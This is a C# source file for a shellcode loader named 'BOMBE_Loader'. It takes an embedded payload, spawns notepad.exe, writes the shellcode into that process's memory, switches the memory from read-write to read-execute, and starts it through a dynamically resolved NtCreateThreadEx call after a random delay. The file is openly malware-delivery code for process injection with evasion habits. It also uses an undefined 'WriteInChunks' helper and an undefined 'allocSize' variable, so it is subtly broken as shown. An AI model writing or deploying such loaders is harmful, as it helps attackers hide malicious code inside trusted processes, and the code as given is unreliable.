using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace BOMBE_Loader
{
    class Program
    {
        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_READWRITE = 0x04;
        const uint PAGE_EXECUTE_READ = 0x20;

        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        const uint THREAD_ALL_ACCESS = 0x001FFFFF;

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }


        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        static extern bool CreateProcessW(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtectEx(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            uint flNewProtect,
            out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);


        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate uint NtCreateThreadExDelegate(
            out IntPtr threadHandle,
            uint desiredAccess,
            IntPtr objectAttributes,
            IntPtr processHandle,
            IntPtr startAddress,
            IntPtr parameter,
            bool createSuspended,
            uint stackZeroBits,
            uint sizeOfStackCommit,
            uint sizeOfStackReserve,
            IntPtr bytesBuffer);

        static NtCreateThreadExDelegate ResolveNtCreateThreadEx()
        {
            IntPtr ntdll = GetModuleHandle("ntdll.dll");
            if (ntdll == IntPtr.Zero)
                throw new Exception("[-] GetModuleHandle(ntdll.dll) failed.");

            IntPtr proc = GetProcAddress(ntdll, "NtCreateThreadEx");
            if (proc == IntPtr.Zero)
                throw new Exception("[-] GetProcAddress(NtCreateThreadEx) failed.");

            return (NtCreateThreadExDelegate)Marshal.GetDelegateForFunctionPointer(
                proc, typeof(NtCreateThreadExDelegate));
        }

        static void Main(string[] args)
        {
            byte[] shellcode = test_malware.Properties.Resources.payload;

            if (shellcode == null || shellcode.Length == 0)
            {
                Console.WriteLine("[-] Failed to load payload from resources.");
                return;
            }

            Console.WriteLine($"[+] Payload loaded. Size: {shellcode.Length} bytes");

            string targetProcess = @"C:\Windows\System32\notepad.exe";

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            si.cb = (uint)Marshal.SizeOf(si);

            Console.WriteLine($"[+] Spawning {targetProcess} (no CREATE_SUSPENDED)...");

            bool success = CreateProcessW(
                targetProcess,
                null,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0,                    // dont CREATE_SUSPENDED
                IntPtr.Zero,
                null,
                ref si,
                out pi);

            if (!success)
            {
                Console.WriteLine($"[-] CreateProcessW failed. Error: {Marshal.GetLastWin32Error()}");
                return;
            }

            Console.WriteLine($"[+] Process created. PID: {pi.dwProcessId}");
            
            IntPtr remoteAddr = VirtualAllocEx(
                pi.hProcess,
                IntPtr.Zero,
                (uint)shellcode.Length,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE);

            if (remoteAddr == IntPtr.Zero)
            {
                Console.WriteLine("[-] VirtualAllocEx failed.");
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }

            Console.WriteLine($"[+] Memory allocated at 0x{remoteAddr.ToInt64():X} (RW)");

            Console.WriteLine("[+] Writing shellcode in chunks...");
            if (!WriteInChunks(pi.hProcess, remoteAddr, shellcode))
            {
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }

            Console.WriteLine("[+] Shellcode written successfully.");

            Console.WriteLine("[+] Changing memory protection RW -> RX...");
            if (!VirtualProtectEx(
                pi.hProcess,
                remoteAddr,
                allocSize,
                PAGE_EXECUTE_READ,
                out uint oldProt))
            {
                Console.WriteLine("[-] VirtualProtectEx failed.");
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }

            Console.WriteLine($"[+] Protection changed. Old protection: 0x{oldProt:X}");

            System.Threading.Thread.Sleep(new Random().Next(100, 400));

            NtCreateThreadExDelegate ntCreateThreadEx;
            try
            {
                ntCreateThreadEx = ResolveNtCreateThreadEx();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }

            Console.WriteLine("[+] Creating remote thread via NtCreateThreadEx...");

            uint ntStatus = ntCreateThreadEx(
                out IntPtr hRemoteThread,
                THREAD_ALL_ACCESS,
                IntPtr.Zero,
                pi.hProcess,
                remoteAddr,
                IntPtr.Zero,
                false,          // execute immediately, don't suspend
                0,
                0x1000,
                0x100000,
                IntPtr.Zero);

            if (ntStatus != 0 || hRemoteThread == IntPtr.Zero)
            {
                Console.WriteLine($"[-] NtCreateThreadEx failed. NTSTATUS=0x{ntStatus:X8}");
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return;
            }

            Console.WriteLine($"[+] Remote thread created. Handle: 0x{hRemoteThread.ToInt64():X}");

            // notepad run by itself
            CloseHandle(hRemoteThread);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);

            Console.WriteLine("[+] Injection complete. Handles closed. Exiting loader.");
        }
    }
}
